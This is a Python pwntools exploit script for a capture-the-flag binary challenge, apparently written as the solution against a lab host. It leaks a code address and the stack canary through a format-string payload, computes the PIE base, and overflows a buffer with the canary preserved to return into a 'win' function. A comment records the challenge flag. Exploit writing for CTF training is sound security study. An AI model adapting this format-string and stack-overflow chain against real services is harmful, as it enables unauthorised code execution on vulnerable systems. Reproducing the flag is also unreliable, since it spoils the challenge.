#!/usr/bin/env python3

from pwn import *
from pprint import pprint
import time

exe = ELF("./binary")

context.binary = exe
remote_address = 'cyberchallenge-web'
port = 9060


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        # GDB code 
        r = gdb.debug(exe.path, '''
        b *main+191

        ''')
    else:
        r = remote(remote_address, port)

    return r


def main():
    r = conn()

    #format_string_offset = 10
    
    # Init ROP
    rop = ROP(exe)
    
    ##leaked addr found at 47 position



    # leaked_addr = 0x555555400820
    # found_base = 0x555555400000
    # leak_offset = leaked_addr-found_base
    
    leak_offset = 0x820


    payload = b'Take this, my grandma made that %39$p canary %15$p'
    #payload = b'Take this, my grandma made that %43$p canary %35$p'
   

    r.sendlineafter(b'slice', payload)
    r.recvuntil(b'you: ')

    resp = r.recvline()

    # Get leaked_addr and canary
    leaked_addr = int(resp.split(b'canary')[0].strip(), 16)
    canary = int(resp.split(b'canary')[1].strip(), 16)
    
    # Compute base address and set the binary
    base_addr = leaked_addr-leak_offset
    exe.address = base_addr


    # Set offset
    offset = 0x50 # buffer is at rbp-0x50

    payload = b'A' * (offset-0x8)
    
    payload += p64(canary)

    payload += b'A' * 8
    
    payload += p64(rop.ret.address+base_addr)
 
    payload += p64(exe.sym['win'])

    
    r.sendlineafter(b'cakes? ', payload)

    r.interactive() # srdnlen{W3_l0v3_Ch3rry_p1e$}


if __name__ == "__main__":
    main()
